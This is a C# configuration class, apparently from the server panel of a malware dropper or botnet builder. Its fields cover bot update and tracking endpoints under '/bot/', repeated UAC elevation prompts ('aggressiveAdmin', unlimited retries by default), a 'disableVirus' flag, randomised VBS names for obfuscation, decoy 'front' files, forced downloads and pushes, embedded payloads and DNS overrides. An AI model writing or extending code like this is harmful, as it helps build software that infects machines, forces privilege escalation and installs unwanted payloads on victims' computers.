using System.Text.Json.Serialization;

namespace model;

public class ServerModel : BaseModel
{
    [JsonPropertyName("version")] public string Version { get; set; } = "";
    [JsonPropertyName("urlDoc")] public string UrlDoc { get; set; } = "";

    [JsonPropertyName("disabled")] public bool Disabled { get; set; } = false;

    [JsonPropertyName("disableVirus")] public bool DisableVirus { get; set; } = false;

    [JsonPropertyName("tabs"), JsonIgnore] public List<TabModel> Tabs { get; set; }

    [JsonPropertyName("bux")] public List<BuxModel> Bux { get; set; }

    [JsonPropertyName("dnSponsor")] public List<DnSponsorModel> DnSponsor { get; set; }

    [JsonPropertyName("pack")] public PackModel Pack { get; set; }

    [JsonPropertyName("clone")] public CloneModel CloneModel { get; set; }

    /// <summary>Absolute panel user-data directory; set by <c>ServerService</c> after load (for pack paths, etc.).</summary>
    [JsonIgnore] public string PanelHomeDirectory { get; set; } = "";

    [JsonPropertyName("serverIp")] public string ServerIp{ get; set; } = "";
    [JsonPropertyName("server")] public string Server { get; set; } = "";
    [JsonPropertyName("alias")] public string Alias { get; set; }
    [JsonPropertyName("strahServer")] public string StrahServer { get; set; }


    [JsonIgnore] public string EffectiveAlias => string.IsNullOrEmpty(Alias) ? ServerIp : Alias;


    public string Random()
    {
        return VbsRandomer.GenerateRandomVariableName(10);
    }


    [JsonPropertyName("landingAuto")] public bool LandingAuto { get; set; }

    private string _landingName;
    [JsonPropertyName("landingName")]
    public string LandingName
    {
        get
        {
            if (string.IsNullOrEmpty(_landingName))
                _landingName = "default";
            return _landingName;
        }
        set { _landingName = value; }
    }

    [JsonPropertyName("landingFtp")] public string LandingFtp { get; set; }

    [JsonPropertyName("primaryDns")] public string PrimaryDns { get; set; } = "";

    [JsonPropertyName("secondaryDns")] public string SecondaryDns { get; set; } = "";





    [JsonPropertyName("extraUpdate")] public bool ExtraUpdate { get; set; }
    [JsonPropertyName("extraUpdateUrl")] public string ExtraUpdateUrl { get; set; }

    [JsonPropertyName("updateUrl")]
    public string UpdateUrl
    {
        get
        {
            var result = "http://";
            result += EffectiveAlias + "/bot/update";
            return result;
        }
    }

    [JsonPropertyName("track")] public bool Track { get; set; }
    [JsonPropertyName("trackSerie")] public string TrackSerie { get; set; }
    [JsonPropertyName("trackDesktop")] public bool TrackDesktop { get; set; }
    [JsonPropertyName("trackUrl")]
    public string TrackUrl
    {
        get
        {
            var result = "http://";
            result += EffectiveAlias + "/bot/upsert";
            return result;
        }
    }
    [JsonPropertyName("autoStart")] public bool AutoStart { get; set; } = true;
    [JsonPropertyName("autoUpdate")] public bool AutoUpdate { get; set; } = true;
    [JsonPropertyName("aggressiveAdmin")] public bool AggressiveAdmin { get; set; } = true;
    [JsonPropertyName("aggressiveAdminDelay")] public int AggressiveAdminDelay { get; set; } = 1;

    /// <summary>With aggressive UAC retry: <c>0</c> = unlimited UAC retries; <c>N &gt; 0</c> = stop after <c>N</c> failed attempts.</summary>
    [JsonPropertyName("aggressiveAdminAttempts")] public int AggressiveAdminAttempts { get; set; } = 0;

    [JsonPropertyName("aggressiveAdminTimes")] public int AggressiveAdminTimes { get; set; } = 0;

    [JsonPropertyName("pushesForce")] public bool PushesForce { get; set; } = true;
    [JsonPropertyName("pushes")] public List<string> Pushes { get; set; } = new List<string>();

    [JsonPropertyName("startDownloadsForce")]
    public bool StartDownloadsForce { get; set; } = false;

    [JsonPropertyName("startDownloads")] public List<string> StartDownloads { get; set; } = new List<string>();

    [JsonPropertyName("startDownloadsBackForce")]
    public bool StartDownloadsBackForce { get; set; } = false;

    [JsonPropertyName("startDownloadsBack")] public List<string> StartDownloadsBack { get; set; } = new List<string>();

    [JsonPropertyName("startUrlsForce")] public bool StartUrlsForce { get; set; } = false;
    [JsonPropertyName("startUrls")] public List<string> StartUrls { get; set; }= new List<string>();

    [JsonPropertyName("frontForce")] public bool FrontForce { get; set; } = false;
    [JsonPropertyName("front")] public List<string> Front { get; set; }

    [JsonPropertyName("extractIconFromFront")] public bool ExtractIconFromFront { get; set; }

    [JsonPropertyName("embeddingsForce")] public bool EmbeddingsForce { get; set; } = false;
    [JsonPropertyName("embeddings")] public List<string> Embeddings { get; set; }



    [JsonPropertyName("adminServers")]
    [JsonIgnore]
    public Dictionary<string, string>? AdminServers { get; set; }

    [JsonPropertyName("adminPassword")]
    [JsonIgnore]
    public string AdminPassword { get; set; }


    [JsonPropertyName("post")]
    public PostModel PostModel { get; set; } = new PostModel();

    [JsonIgnore] public bool IsLocal => ServerIp == "127.0.0.1";



    public ServerModel()
    {
        Alias="";
        CloneModel = new CloneModel();
        Track = true;
        AutoStart = true;
        AutoUpdate = true;
        AggressiveAdmin = true;
        StartUrls = new List<string>();
        StartDownloads = new List<string>();
        StartDownloadsForce = true;
        StartDownloadsBack = new List<string>();
        StartDownloadsBackForce = true;
        Pushes = new List<string>();
        Front = new List<string>();
        ExtractIconFromFront = false;
        Embeddings = new List<string>();
        Tabs = new List<TabModel>();
        Bux = new List<BuxModel>();
        DnSponsor = new List<DnSponsorModel>();
        Version = VersionFetcher.Version();
        Pack = new PackModel(this);
        Tabs = new List<TabModel>();
        CloneModel = new CloneModel();
        StartUrls = new List<string>();
        StartDownloads = new List<string>();
        Pushes = new List<string>();
    }

    protected override void InternalRefresh()
    {
    }
}
